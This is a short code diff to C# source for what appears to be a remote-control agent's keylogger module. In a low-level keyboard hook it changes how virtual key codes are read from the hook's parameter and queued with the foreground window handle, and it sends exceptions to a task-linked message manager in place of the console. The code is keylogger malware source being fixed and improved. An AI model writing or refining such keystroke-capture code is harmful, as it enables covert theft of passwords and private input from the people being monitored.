@@ -1,5 +1,6 @@
 ﻿using System.Collections.Concurrent;
 using System.Diagnostics;
+using System.Runtime.InteropServices;
 using System.Text;
 using Agent.Interfaces;
 using Agent.Models;
@@ -96,8 +97,8 @@ namespace Agent
             }
             catch (Exception ex)
             {
-                Console.WriteLine("[X] Exception: {0}", ex.Message);
-                Console.WriteLine("[X] Stack Trace: {0}", ex.StackTrace);
+                messageManager.WriteLine(ex.ToString(), task_id, true);
+                return false;
             }
 
 
@@ -327,7 +328,8 @@ namespace Agent
                 IntPtr hWindow = Native.GetForegroundWindow();
                 if (hWindow != IntPtr.Zero)
                 {
-                    Keystroke ks = new Keystroke(hWindow, code);
+                    int vKey = Marshal.ReadInt32(lParam);
+                    Keystroke ks = new Keystroke(hWindow, vKey);
                     this.keyQueue.Enqueue(ks);
                     this.OnKbHappened?.Invoke();
                 }
